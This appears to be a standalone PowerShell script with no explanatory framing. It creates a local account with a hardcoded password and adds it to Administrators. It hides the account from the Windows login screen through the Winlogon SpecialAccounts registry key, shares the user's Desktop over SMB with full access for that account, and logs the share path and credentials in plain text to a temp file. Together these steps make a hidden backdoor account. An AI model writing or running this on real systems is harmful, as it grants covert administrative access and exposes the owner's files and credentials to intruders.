# Create Log File
$LOG_FILE = "C:\Windows\Temp\desktop.log"


# Create New User
    # add admin rights
$userName = "tempUser"
$passWord = "Password1!Password1!"
$fullName = "temp user"
$description = "temp user"
New-LocalUser -Name $userName -Password $passWord -FullName $fullName -Description $description
Add-LocalGroupMember -Group "Administrators" -Member $userName


# Create Registry Key to hide user account on login screen
$regName = "tempUser"
$regValue = "0"
New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "SpecialAccounts"
New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts" -Name "UserList"
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name $regName -Value $regValue -PropertyType DWORD -Force


# Create SMB share
$shareName = "Desktop"
$getDomain = (Get-WmiObject Win32_ComputerSystem).Domain
$getUser = "$getDomain\$userName"
New-SmbShare -Name $shareName -Path "C:\Users\$env:USERNAME\Desktop" -FullAccess $userName


# Return Share Drive Path
$getSharePath = (Get-WmiObject Win32_Share -filter "Name LIKE 'Desktop'").path
$getHost = (Get-WmiObject Win32_ComputerSystem).Name
$getIP = (Test-Connection -ComputerName $getHost -Count 1).IPV4Address.IPAddressToString
$sharePath = "\\$($getIP)\$($getSharePath)"


# Write to log file
"Share Drive Location: $($sharePath)" | Out-File -FilePath $LOG_FILE -Append -Force -Encoding ascii
"User Name: $($userName)" | Out-File -FilePath $LOG_FILE -Append -Force -Encoding ascii
"Password: $($passWord)" | Out-File -FilePath $LOG_FILE -Append -Force -Encoding ascii
